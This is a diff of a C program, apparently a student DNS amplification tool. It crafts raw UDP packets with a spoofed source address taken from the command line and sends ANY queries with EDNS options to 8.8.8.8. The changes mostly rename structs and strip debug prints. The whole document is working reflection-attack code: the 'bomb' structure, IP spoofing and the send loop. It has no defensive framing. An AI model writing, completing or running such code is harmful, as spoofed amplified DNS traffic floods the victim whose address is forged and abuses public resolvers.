@@ -11,25 +11,18 @@
 #include <netinet/udp.h>
 
 
-/* default settings */
+/* Define settings */
 #define DEFAULT_SPOOF_ADDR  "127.0.0.1"
 #define DEFAULT_DOMAIN      "www.nctu.edu.tw"
 #define DEFAULT_DNS_PORT    53
 #define DEFAULT_LOOPS       10000
 
 
-char *spoof_addr;
-typedef struct{
-    unsigned char name;
-    unsigned short type;
-    unsigned short udplength;
-    unsigned char rcode;
-    unsigned char ednsversion;
-    unsigned short Z;
-    unsigned short datalength;
-}dns_opt;
+/* Initialize global varible */
+char *spoof_address;
 
-/* dns header */
+
+/* All the structure */
 typedef struct {
     unsigned short id;
     unsigned char rd :1;
@@ -46,16 +39,23 @@ typedef struct {
     unsigned short ans_count;
     unsigned short auth_count;
     unsigned short add_count;
-} dnsheader_t;
+} DNS_header;
 
 
-/* dns query */
 typedef struct {
     unsigned short qtype;
     unsigned short qclass;
-} query_t;
+} DNS_query;
 
-
+typedef struct{
+    unsigned char name;
+    unsigned short type;
+    unsigned short udplength;
+    unsigned char rcode;
+    unsigned char ednsversion;
+    unsigned short Z;
+    unsigned short datalength;
+} DNS_opt;
 
 /* our bomb */
 typedef struct {
@@ -65,9 +65,9 @@ typedef struct {
     struct sockaddr_in target;
     struct iphdr *ip;
     struct udphdr *udp;
-    dnsheader_t *dns;
-    query_t *query;
-    dns_opt *opt;
+    DNS_header *dns;
+    DNS_query *query;
+    DNS_opt *opt;
 } bomb_t;
 
 
@@ -137,14 +137,14 @@ bomb_t *build_ip_header(bomb_t *bomb)
     bomb->ip->version = 4;
     bomb->ip->ihl = 5;
     bomb->ip->id = htonl(rand());
-    bomb->ip->saddr = inet_addr(spoof_addr);
+    bomb->ip->saddr = inet_addr(spoof_address);
     bomb->ip->daddr = inet_addr("8.8.8.8");
     bomb->ip->ttl = 64;
     bomb->ip->tos = 0;
     bomb->ip->frag_off = 0;
     bomb->ip->protocol = IPPROTO_UDP;
     bomb->ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) +
-                              sizeof(dnsheader_t) + sizeof(query_t) + sizeof(dns_opt)
+                              sizeof(DNS_header) + sizeof(DNS_query) + sizeof(DNS_opt)
                              + strlen(DEFAULT_DOMAIN) + 1);
     bomb->ip->check = checksum((unsigned short *) bomb->ip,
                                sizeof(struct iphdr));
@@ -160,7 +160,7 @@ bomb_t *build_udp_header(bomb_t *bomb)
 
     bomb->udp->source = htons(rand());
     bomb->udp->dest = htons(DEFAULT_DNS_PORT);
-    bomb->udp->len = htons(sizeof(struct udphdr) + sizeof(dnsheader_t) + sizeof(dns_opt) + sizeof(query_t) + strlen(DEFAULT_DOMAIN) + 1);
+    bomb->udp->len = htons(sizeof(struct udphdr) + sizeof(DNS_header) + sizeof(DNS_opt) + sizeof(DNS_query) + strlen(DEFAULT_DOMAIN) + 1);
     bomb->udp->check = 0;
 
     return bomb;
@@ -194,7 +194,7 @@ bomb_t *build_dns_request(bomb_t *bomb)
     char *qname = NULL;
 
 
-    bomb->dns = (dnsheader_t *) (bomb->packet + sizeof(struct iphdr) + 
+    bomb->dns = (DNS_header *) (bomb->packet + sizeof(struct iphdr) + 
                            sizeof(struct udphdr));
 
     bomb->dns->id = (unsigned short) htons(getpid());
@@ -214,17 +214,17 @@ bomb_t *build_dns_request(bomb_t *bomb)
     bomb->dns->add_count = htons(1);
 
     qname = &bomb->packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 
-        sizeof(dnsheader_t)];
+        sizeof(DNS_header)];
     /*job->domain = "www.google.com.";*/
     dns_name_format(qname, DEFAULT_DOMAIN);
 
-    bomb->query = (query_t *) &bomb->packet[sizeof(struct iphdr) + 
-        sizeof(struct udphdr) + sizeof(dnsheader_t) + (strlen(qname) + 1)];
+    bomb->query = (DNS_query *) &bomb->packet[sizeof(struct iphdr) + 
+        sizeof(struct udphdr) + sizeof(DNS_header) + (strlen(qname) + 1)];
 
     bomb->query->qtype = htons(255);
     bomb->query->qclass = htons(1);
-    bomb->opt = (dns_opt*)(bomb->packet + sizeof(struct iphdr) + 
-                           sizeof(struct udphdr) + sizeof(dnsheader_t) + (strlen(qname)) + sizeof(query_t) + 1);
+    bomb->opt = (DNS_opt*)(bomb->packet + sizeof(struct iphdr) + 
+                           sizeof(struct udphdr) + sizeof(DNS_header) + (strlen(qname)) + sizeof(DNS_query) + 1);
     bomb->opt->name = 0;
     /*printf("%d\n",bomb->opt->type);*/
     bomb->opt->type  =htons(41) ;
@@ -267,7 +267,6 @@ bomb_t *fill_sockaddr(bomb_t *bomb)
 /* start action! */
 void Implement(int c)
 {
-    printf("check2\n");
     bomb_t *bomb = NULL;
 
     
@@ -280,7 +279,7 @@ void Implement(int c)
     bomb = fill_sockaddr(bomb);
 
     sendto(bomb->sock, bomb->packet, sizeof(struct iphdr) + 
-            sizeof(struct udphdr) + sizeof(dnsheader_t) + sizeof(query_t) + sizeof(dns_opt)+ strlen(DEFAULT_DOMAIN) + 1, 0, (struct sockaddr *) &bomb->target, 
+            sizeof(struct udphdr) + sizeof(DNS_header) + sizeof(DNS_query) + sizeof(DNS_opt)+ strlen(DEFAULT_DOMAIN) + 1, 0, (struct sockaddr *) &bomb->target, 
             sizeof(bomb->target));
 
     close(bomb->sock);
@@ -291,26 +290,20 @@ void Implement(int c)
 }
 
 
-/* free dnsdrdos \o/ */
-
 int main(int argc, char **argv)
 {
     int a = 0;
     unsigned int i = 0;
-   
-    printf("check0\n");
 
     printf("%s\n", argv[1]);
-    spoof_addr = argv[1];
-    printf("%s\n", spoof_addr);
-    printf("check1\n");
+    spoof_address = argv[1];
+    printf("%s\n", spoof_address);
+
     for (i = 0; i < 10; i++) {
         Implement(a);
         printf("packet %d\n",i);
     }
     printf("\n");
-    
- 
     
     return 0;
 }
